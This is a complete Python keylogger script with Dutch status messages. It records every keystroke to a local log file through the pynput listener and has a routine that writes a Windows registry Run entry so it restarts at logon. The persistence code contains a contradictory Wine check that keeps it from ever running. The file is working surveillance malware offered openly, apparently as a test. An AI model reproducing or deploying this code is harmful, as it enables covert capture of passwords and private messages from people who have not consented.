import os
import sys
import getpass
import logging
import subprocess
import time
import platform
from pynput.keyboard import Listener

is_wine = platform.system() == "Windows" and "wine" in platform.version().lower()
current_user = getpass.getuser()

if getattr(sys, 'frozen', False):
    script_location = os.path.dirname(sys.executable)
else:
    script_location = os.path.dirname(os.path.abspath(__file__))

log_file = os.path.join(script_location, "keylog.txt")
logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(message)s")

def log_keystroke(key):
    try:
        key = key.char
    except AttributeError:
        key = f"[{key}]"
    logging.info(key)

def setup_persistence():
    if is_wine:
        try:
            registry_command = [
                "reg", "add",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", "Keylogger",
                "/t", "REG_SZ",
                "/d", os.path.abspath(sys.executable),
                "/f"
            ]
            subprocess.run(registry_command, check=True)
            print("[INFO] Persistentie ingesteld via Windows-registers.")
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Fout bij het instellen van registers: {e}")

if __name__ == "__main__":
    if not is_wine:
        setup_persistence()
    print("[INFO] Keylogger actief. Toetsen worden gelogd...") # dit is als info voor de test
    
    with Listener(on_press=log_keystroke) as listener:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("[INFO] Keylogger gestopt.")
        except Exception as e:
            print(f"[ERROR] Fout opgetreden: {e}")  
        listener.join()